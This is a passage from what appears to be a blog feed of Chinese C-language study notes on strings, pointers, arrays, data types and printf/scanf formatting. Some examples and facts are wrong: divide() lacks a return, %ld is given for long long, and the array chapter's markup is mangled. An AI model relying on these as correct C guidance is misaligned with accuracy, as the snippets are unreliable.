class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c[]=&quot;ABCDefG&quot;;</span><br><span class="line">    printf(&quot;%s\n&quot;,strlwr(c));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strupr</p><ul><li>将字符串中小写字母转换为大写字母函数</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c[]=&quot;ABCDefG&quot;;</span><br><span class="line">    printf(&quot;%s\n&quot;,strupr(c));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安全问题</p><ul><li>要考虑</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 字符串 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第四章 指针</title>
      <link href="/38.html"/>
      <url>/38.html</url>
      
        <content type="html"><![CDATA[<p>指针</p><ul><li>就是保存地址的变量</li><li>%p 用来输出指针的值、输出地址符，以16进制的形式输出内存地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">int* p = &amp;i;</span><br><span class="line">int* p,q;</span><br><span class="line">int *p,q;</span><br><span class="line">int *p,*q;</span><br></pre></td></tr></table></figure><p>指针变量</p><ul><li>指针变量的值是具有实际值的变量的地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void f(int *p);</span><br><span class="line"></span><br><span class="line">int i=0;</span><br><span class="line">f(&amp;i);</span><br></pre></td></tr></table></figure><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void f(int *p);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int i = 6;</span><br><span class="line">    printf(&quot;&amp;i=%p\n&quot;,&amp;i);</span><br><span class="line">    f(&amp;i);</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void f(int *p)&#123;</span><br><span class="line">    printf(&quot;p=%p\n&quot;,p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针应用场景</p><ul><li>场景一：交换两个变量的值 [ swap(&amp;a,&amp;b) ]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void swap(int *pa,int *pb)&#123;</span><br><span class="line">    int t = *pa;</span><br><span class="line">    *pa = *pb;</span><br><span class="line">    *pb = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>场景二：求最大、最小值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void minmax(int a[],int len,int *min,int *max)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    *min = *max = a[0];</span><br><span class="line">    for(i=1;i&lt;len;i++)&#123;</span><br><span class="line">        if(a[i]&lt;*min)&#123;</span><br><span class="line">            *min = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        if(a[i]&gt;*max)&#123;</span><br><span class="line">            *max = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>场景三：函数返回运算的状态，结果通过指针返回</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int divide(int a,int b,int *result);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int a = 5;</span><br><span class="line">    int b = 2;</span><br><span class="line">    int c;</span><br><span class="line">    if(divide(a,b,&amp;c))&#123;</span><br><span class="line">        printf(&quot;%d/%d=%d\n&quot;,a,b,c);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int divide(int a,int b,int *result)&#123;</span><br><span class="line">    int ret = 1;</span><br><span class="line">    if(b == 0)&#123;</span><br><span class="line">        ret = 0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        *result = a/b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{cat_tips_B}注：数组变量是特殊的指针{&#x2F;cat_tips_B}</p><ul><li><p>数组变量本身表达地址，所以</p><ul><li>int a[10];int *p &#x3D; a; &#x2F;&#x2F; 无需用&amp;取地址</li><li>a &#x3D;&#x3D; &amp;a[0]</li></ul></li></ul><p>指针计算</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    char ac[] = &#123;0,1,2,3,4,5,6,7,8,9,&#125;;</span><br><span class="line">    char *p = &amp;ac[0];</span><br><span class="line">    char *p1 = &amp;ac[5];</span><br><span class="line">    printf(&quot;p=%p\n&quot;,p);</span><br><span class="line">    printf(&quot;p+1=%p\n&quot;,p+1);</span><br><span class="line">    printf(&quot;p1-p=%d\n&quot;,p1-p);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{cat_tips_A}p++{&#x2F;cat_tips_A}</p><ul><li>*的优先级虽然高，但是没有++高</li><li>取出p所指的那个数据来，完事之后顺便把p移到下一个位置去</li><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    char ac[] = &#123;0,1,2,3,4,5,6,7,8,9,-1&#125;;</span><br><span class="line">    char *p = &amp;ac[0];</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;sizeof(ac)/sizeof(ac[0]);i++)&#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,ac[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    while(*p != -1)&#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,*p++);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{cat_tips_A}0地址{&#x2F;cat_tips_A}</p><ul><li><p>内存中有0地址，但是不能随便碰</p></li><li><p>0地址用来表示特殊的事情：</p><ul><li>返回的指针是无效的</li><li>指针没有被真正初始化(先初始化为0)</li></ul></li><li><p>NULL是一个预定定义的符号，表示0地址</p></li></ul><p>动态内存分配</p><p>{cat_tips_A}输入数据{&#x2F;cat_tips_A}</p><ul><li>int <em>a &#x3D; (int</em> )malloc(n * sizeof(int))</li><li>向 malloc 申请的空间的大小是以字节为单位的，返回的是void * ，需要类型转换为自己需要的类型</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int number;</span><br><span class="line">    int *a;</span><br><span class="line">    int i;</span><br><span class="line">    printf(&quot;输入数量：&quot;); </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">    a = (int *)malloc(number*sizeof(int));</span><br><span class="line">    for(i=0;i&lt;number;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=number-1;i&gt;=0;i--)&#123;</span><br><span class="line">        printf(&quot;%d &quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    free(a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第三章 数组</title>
      <link href="/37.html"/>
      <url>/37.html</url>
      
        <content type="html"><![CDATA[<h2 id="3-1-一维数组"><a href="#3-1-一维数组" class="headerlink" title="3.1 一维数组"></a>3.1 一维数组</h2><p>数组大小</p><ul><li>const int number &#x3D; 10;</li><li>使用 sizeof 给出整个数组所占据的内容的大小，单位是字节：<code>sizeof(a)/sizeof(a[0])</code></li></ul><p>初始化数组</p><ul><li><pre><code>for(i=0;i&lt;number;i++)&#123;        count[i]=0;    &#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">集成初始化</span><br><span class="line"></span><br></pre></td></tr></table></figure>int a[] = &#123;2,4,6,7,1&#125;;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">*   集成初始化时的定位</span><br><span class="line">    </span><br></pre></td></tr></table></figure>int a[10] = &#123;[0] = 2,[2] = 3,6,&#125;;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    定义数组</span><br><span class="line">    </span><br><span class="line">*   &lt; 类型 &gt; 变量名称 \[ 元素数量 \]</span><br><span class="line">*   int number\[100\];</span><br><span class="line">*   scanf(&quot;%d&quot;,&amp;number\[i\]);</span><br><span class="line">*   int grades\[100\];</span><br><span class="line">*   double weight\[20\];</span><br><span class="line">*   元素数量必须是整数</span><br><span class="line">*   使用数组时放在\[\]中的数字叫做下标或索引，下标从0开始计数</span><br><span class="line">*   有效的下标范围</span><br><span class="line">    </span><br><span class="line">    *   \[ 0 , 数组的大小 - 1 \]</span><br><span class="line">    </span><br><span class="line">    数组的赋值</span><br><span class="line">    </span><br><span class="line">    &#123;cat\_tips\_B&#125;注：数组变量本身不能被赋值，要把一个数组的所有元素交给另一个数组，必须采用遍历&#123;/cat\_tips\_B&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>for(i=0;i&lt;length;i++)&#123;  b[i] = a[i];&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">数组运算</span><br><span class="line"></span><br><span class="line">遍历数组输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>for(i=0;i&lt;number;i++)&#123;  printf(&quot;%d:%d\n&quot;,i,count[i]);&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 3.2 二维数组</span><br><span class="line"></span><br><span class="line">int a \[ 3 \] \[ 5 \] 理解为 a 是一个 3 行 5 列的矩阵</span><br><span class="line"></span><br><span class="line">&#123;cat\_tips\_B&#125;注：列数必须给出&#123;/cat\_tips\_B&#125;</span><br><span class="line"></span><br><span class="line">初始化</span><br><span class="line"></span><br></pre></td></tr></table></figure>int a[][5] = &#123;  &#123;0,1,2,3,4&#125;,  &#123;2,3,4,5,6&#125;,</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第二章 基本语法</title>
      <link href="/36.html"/>
      <url>/36.html</url>
      
        <content type="html"><![CDATA[<h2 id="2-1-数据的表现形式"><a href="#2-1-数据的表现形式" class="headerlink" title="2.1 数据的表现形式"></a>2.1 数据的表现形式</h2><ol><li>常量</li></ol><p>在程序运行过程中，其值不能被改变的量称为常量</p><p>常量有以下几类：</p><p>（1）整型常量：如 1000，12345，0，-234 等</p><p>（2）实型常量：十进制小数形式、指数形式</p><p>（3）字符常量：① 普通字符，用单撇号括起来的一个字符，如 ‘a’, ‘Z’ 等 ② 转义字符，如 ‘\‘’,’\‘ 等</p><p>（4）字符串常量：用双引号引起来的多个字符，如 “China” 等</p><p>（5）符号常量：用 #define 指令，指定用一个符号名称代表一个常量，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define PI 3.1416</span><br></pre></td></tr></table></figure><p>{cat_tips_A}符号常量的优点：含义清楚、一改全改{&#x2F;cat_tips_A}</p><ol start="2"><li>变量</li></ol><p>变量代表一个有名字的、具有特定属性的一个存储单元，它用来存放数据，也就是存放变量的值。在程序运行期间，变量的值是可以改变的。</p><p>{cat_tips_A}变量必须先定义，后使用{&#x2F;cat_tips_A}</p><ol start="3"><li><p>常变量</p><p>C99 允许使用常变量：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const int AMOUNT = 100;</span><br></pre></td></tr></table></figure><p>常变量是有名字的不变量，而常量是没有名字的不变量。</p><p>{cat_tips_B}常变量和符号常量有什么不同？{&#x2F;cat_tips_B}</p><p>答：定义符号常量用 #define 指令，它是预编译指令，它知识用符号常量代表一个字符串，在预编译时仅是进行字符替换，在预编译后，符号常量就不存在了，对符号常量的名字是不分配存储单元的。而常变量要占用存储单元，有变量值，只是该值不改变。</p><ol start="4"><li><p>标识符</p><p>标识符就是一个对象的名字。如变量名、函数名等等</p></li></ol><p>C语言规定标识符只能由字母、数字和下划线 3 种字符组成，且第一个字符必须为字母或下划线。</p><h2 id="2-2-数据类型"><a href="#2-2-数据类型" class="headerlink" title="2.2 数据类型"></a>2.2 数据类型</h2><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423181641.png" alt="20200423181641" title="20200423181641"></p><p>（1）int 型</p><p>编译系统分配给 int 型数据 2 个字节或 4 个字节（VC++ 6.0 就是分配 4 个字节）。<br>在存储单元中的存储方式：用整数的补码形式存放。<br>int 表示一个寄存器的大小</p><p>（2）short int 型</p><p>分配 2 个字节</p><p>（3）long int 型</p><p>分配 4 个字节，在一个整数的末尾加大写字母 L 或小写字母 l 即可表示为 long int 型</p><p>（4）long long int 型</p><p>分配 8 个字节</p><p>（5）字符 char 类型</p><p>分配 1 个字节</p><p>（6）float 类型(单精度浮点型)</p><p>分配 4 个字节</p><p>（7）double 类型(双精度浮点型)</p><p>分配 8 个字节</p><p>（8）long double 类型(长双精度浮点型)</p><p>Turbo C 分配给 long double 16 个字节<br>Visual C++ 6.0 分配 8 个字节</p><h2 id="2-3-关键字和保留标识符"><a href="#2-3-关键字和保留标识符" class="headerlink" title="2.3 关键字和保留标识符"></a>2.3 关键字和保留标识符</h2><p>auto</p><p>break</p><p>case</p><p>char</p><p>const</p><p>continue</p><p>default</p><p>do</p><p>double</p><p>else</p><p>enum</p><p>extern</p><p>float</p><p>for</p><p>goto</p><p>if</p><p>int</p><p>long</p><p>register</p><p>return</p><p>short</p><p>signed</p><p>sizeof</p><p>static</p><p>struct</p><p>switch</p><p>typedef</p><p>union</p><p>unsigned</p><p>void</p><p>volatile</p><p>while</p><p>inline</p><p>restrict</p><h2 id="2-4-赋值和初始化"><a href="#2-4-赋值和初始化" class="headerlink" title="2.4 赋值和初始化"></a>2.4 赋值和初始化</h2><ul><li>变量初始化</li><li>&lt;类型名称&gt;&lt;变量名称&gt; &#x3D; &lt;初始值&gt;；</li><li>eg. int price &#x3D; 0;</li></ul><h2 id="2-5-运算符和算子"><a href="#2-5-运算符和算子" class="headerlink" title="2.5 运算符和算子"></a>2.5 运算符和算子</h2><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423184738.png" alt="20200423184738" title="20200423184738"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg.</span><br><span class="line">    int a = b + 5;</span><br></pre></td></tr></table></figure><ul><li>计算时间差</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot; </span><br><span class="line">/*计算时间差*/ </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int hour1, minute1;</span><br><span class="line">    int hour2, minute2;</span><br><span class="line">    scanf(&quot;%d %d&quot;, &amp;hour1, &amp;minute1);</span><br><span class="line">    scanf(&quot;%d %d&quot;, &amp;hour2, &amp;minute2);</span><br><span class="line">    int t1 = hour1 * 60 + minute1;</span><br><span class="line">    int t2 = hour2 * 60 + minute2;</span><br><span class="line">    int t = t2 - t1;</span><br><span class="line">    printf(&quot;时间差是 %d 小时 %d 分钟。&quot;,t/60, t%60); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>运算符优先级</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185219.png" alt="image-20200306092454286" title="image-20200306092454286"></p><p>自增、自减运算符：</p><ol><li>++i 、–i ：使用 i 之前，先使 i 的值加（减）1</li><li>i++ 、i– ：在使用i之后，使 i 的值加（减）1</li><li>自增、自减运算符只能用于变量，而不能用于常量或表达式。</li></ol><p>强制类型转换运算符：(类型名)(表达式)</p><p>求字节数运算符：sizeof</p><h2 id="2-6-数据的输入输出"><a href="#2-6-数据的输入输出" class="headerlink" title="2.6 数据的输入输出"></a>2.6 数据的输入输出</h2><p>scanf (格式输入)、printf (格式输出)</p><p>getchar (输入字符)、putchar (输出字符)</p><p>gets (输入字符串)、puts (输出字符串)</p><p>在使用它们之前需要在开头用预处理指令 #include &lt;stdio.h&gt;</p><p>printf 函数的一般格式</p><p>printf (格式控制，输出列表)</p><p>例如：printf (“ %f 约等于 %d “, i , c );</p><p>1 类型安全</p><ul><li>强类型</li><li>早期语言强调类型，面向底层的语言强调类型</li><li>C语言需要类型，但是对类型的安全检查并不足够</li></ul><p>2 sizeof</p><ul><li>是一个静态运算符，给出某个类型或者变量在内存中所占据的字节数</li><li>sizeof(int)</li><li>sizeof(i)</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a = 6;</span><br><span class="line">    printf(&quot;sizeof(int)=%ld\n&quot;,sizeof(int));</span><br><span class="line">    printf(&quot;sizeof(a)=%ld\n&quot;,sizeof(a));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 补码</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = 255;</span><br><span class="line">    int i = 255;</span><br><span class="line">    printf(&quot;c=%d,i=%d\n&quot;,c,i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4 unsigned</p><ul><li>无符号整数型（0-255）</li><li>255u</li><li>用 l 或 L 表示 long</li><li>unsigned 的初衷并非是扩展数能表达的范围，而是为了做纯二进制运算，主要是为了移位</li></ul><h3 id="2-6-1-整数的输入输出"><a href="#2-6-1-整数的输入输出" class="headerlink" title="2.6.1 整数的输入输出"></a>2.6.1 整数的输入输出</h3><ul><li>只有两种形式：int 或 long long</li><li>%d：int</li><li>%u：unsigned</li><li>%ld：long long</li><li>%lu：unsigned long long</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = -1;</span><br><span class="line">    int i = -1;</span><br><span class="line">    printf(&quot;c=%u,i=%u\n&quot;,c,i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：八进制和十六进制转换为十进制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = 012;//八进制 </span><br><span class="line">    int i = 0x12;//十六进制 </span><br><span class="line">    printf(&quot;c=%d,i=%d\n&quot;,c,i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：八进制和十六进制输出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = 012;//八进制 </span><br><span class="line">    int i = 0x12;//十六进制 </span><br><span class="line">    printf(&quot;c=0%o,i=0x%x\n&quot;,c,i);</span><br><span class="line">    printf(&quot;c=0%o,i=0x%X\n&quot;,c,i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-6-2-浮点数的输入输出"><a href="#2-6-2-浮点数的输入输出" class="headerlink" title="2.6.2 浮点数的输入输出"></a>2.6.2 浮点数的输入输出</h3><ul><li><p>float （4字节） 输入 %f 格式，输出 %f 或 %e</p></li><li><p>double （8字节）输入 %lf 格式，输出 %lf 或 %e</p></li><li><p>科学计数法：-5.67E+16</p></li><li><p>输出精度：</p><ul><li>在 % 和 f 之间加上 .n 可以指定输出小数点后几位，这样的输出是做4舍5入的</li><li>printf(“%.3f\n”,-0.0046);</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%.3f\n&quot;,-0.0046);</span><br><span class="line">    printf(&quot;%.30f\n&quot;,-0.0046);</span><br><span class="line">    printf(&quot;%.3f\n&quot;,-0.00046);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>超过范围的浮点数:</p><ul><li>printf 输出 inf 表示超过范围的浮点数：±∞</li><li>printf 输出 nan 表示不存在的浮点数</li></ul></li><li><p>Example 01:</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%f\n&quot;,12.0/0.0);</span><br><span class="line">    printf(&quot;%f\n&quot;,-12.0/0.0);</span><br><span class="line">    printf(&quot;%f\n&quot;,0.0/0.0);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>浮点运算的精度</p><ul><li>f1 &#x3D;&#x3D; f2 可能值相等，但不等</li><li>利用 fabs(f1-f2)&lt;1e-12</li></ul></li></ul><h3 id="2-6-3-字符的输入输出"><a href="#2-6-3-字符的输入输出" class="headerlink" title="2.6.3 字符的输入输出"></a>2.6.3 字符的输入输出</h3><ul><li><p>如何输入 ‘1‘ 这个字符给 char c？</p><ul><li>scanf(“%c”,&amp;c);</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c;</span><br><span class="line">    scanf(&quot;%c&quot;,&amp;c);</span><br><span class="line">    printf(&quot;c=%d\n&quot;,c);</span><br><span class="line">    printf(&quot;c=%c\n&quot;,c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span 